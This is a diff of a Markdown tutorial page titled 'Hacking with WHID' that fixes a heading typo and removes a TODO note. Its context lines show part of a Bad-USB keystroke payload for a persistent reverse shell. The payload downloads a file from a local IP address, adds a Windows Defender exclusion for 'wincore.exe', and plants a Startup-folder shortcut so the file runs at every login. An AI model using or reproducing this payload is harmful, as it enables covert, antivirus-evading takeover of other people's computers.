@@ -14,7 +14,7 @@ toc: true
 title: Hacking with WHID
 ---
 
-## Presistent reverse shell
+## Persistent reverse shell
 
 A reverse shell is great, but what if he stayed, no matter what? Using a Bad-USB of any kind, you can inject a payload to create a persistent reverse shell.
 
@@ -115,7 +115,7 @@ PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/i
 PrintLine:Add-MpPreference -ExclusionProcess "wincore.exe"
 PrintLine:$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\wscript.exe";$s.Arguments="`"$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs`" `"C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe`""; $s.Save();
 exit
-```//TODO sources
+```
 
 This little piece of code will make the perfect shell. Let's look at it line by line.
 
